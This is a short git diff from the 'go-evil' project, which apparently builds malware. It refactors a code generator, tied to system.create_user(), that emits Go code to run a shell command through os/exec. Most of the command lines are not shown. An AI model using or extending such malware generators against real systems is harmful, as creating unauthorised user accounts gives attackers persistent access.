@@ -4,6 +4,7 @@ import (
 	"fmt"
 
 	"github.com/TeamPhoneix/go-evil/utility/structure"
+	"github.com/TeamPhoneix/go-evil/utility/structure/functions"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
@@ -19,7 +20,7 @@ func Create(value string, s_json string) ([]string, string) {
 		notify.Error(fmt.Sprintf("Obtained evil array had size %d, but 2 was requested", arr.Length()), "system.create_user()")
 	}
 
-	body := []string{fmt.Sprintf("func %s(repr_1 []int, repr_2 []int){", function_call),
+	body := []string{
 		"param_1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
 		"param_2 := spine.variable.get(spine.alpha.construct_string(repr_2))",
 		"command := \"\"",
@@ -41,7 +42,10 @@ func Create(value string, s_json string) ([]string, string) {
 		"spine.log(err.Error())",
 		"}}"}...)
 
-	data_object.Add_go_function(body)
+	data_object.Add_go_function(functions.Go_func_t{Name: function_call, Func_type: "", Part_of_struct: "", Return_type: "",
+		Parameters: []string{"repr_1 []int", "repr_2 []int"},
+		Gut:        body})
+
 	data_object.Add_go_import("os/exec")
 	data_object.Add_go_import("strings")
 
